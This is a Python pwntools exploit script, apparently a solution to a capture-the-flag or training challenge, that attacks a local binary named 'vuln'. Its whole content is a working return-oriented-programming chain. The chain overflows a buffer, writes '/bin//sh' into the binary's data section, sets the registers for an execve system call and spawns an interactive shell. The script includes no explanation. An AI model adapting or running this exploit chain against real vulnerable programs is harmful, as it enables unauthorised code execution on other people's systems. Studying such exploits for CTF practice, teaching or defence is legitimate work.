#!/usr/bin/env python2

from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

context.terminal = ['tmux', 'new-window']
#gdb.attach(p, 'b *vuln+55')

p.recv()

payload = 'A'*28
payload += p32(0x0806ee6b) # pop edx ; ret
payload += p32(0x080da060) # @ .data
payload += p32(0x08056334) # pop eax ; pop edx ; pop ebx ; ret
payload += '/bin'
payload += p32(0x080da060) # padding without overwrite edx
payload += p32(0x41414141) # padding
payload += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
payload += p32(0x0806ee6b) # pop edx ; ret
payload += p32(0x080da064) # @ .data + 4
payload += p32(0x08056334) # pop eax ; pop edx ; pop ebx ; ret
payload += '//sh'
payload += p32(0x080da064) # padding without overwrite edx
payload += p32(0x41414141) # padding
payload += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
payload += p32(0x0806ee6b) # pop edx ; ret
payload += p32(0x080da068) # @ .data + 8
payload += p32(0x0805bbf6) # xor eax, eax ; pop esi ; pop edi ; ret
payload += p32(0x41414141) # padding
payload += p32(0x41414141) # padding
payload += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
payload += p32(0x080481c9) # pop ebx ; ret
payload += p32(0x080da060) # @ .data
payload += p32(0x0806ee92) # pop ecx ; pop ebx ; ret
payload += p32(0x080da068) # @ .data + 8
payload += p32(0x080da060) # padding without overwrite ebx
payload += p32(0x0806ee6b) # pop edx ; ret
payload += p32(0x080da068) # @ .data + 8
payload += p32(0x0805bbf6) # xor eax, eax ; pop esi ; pop edi ; ret
payload += p32(0x41414141) # padding
payload += p32(0x41414141) # padding
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x0807c2fa) # inc eax ; ret
payload += p32(0x08049563) # int 0x80

p.sendline(payload)

p.interactive()
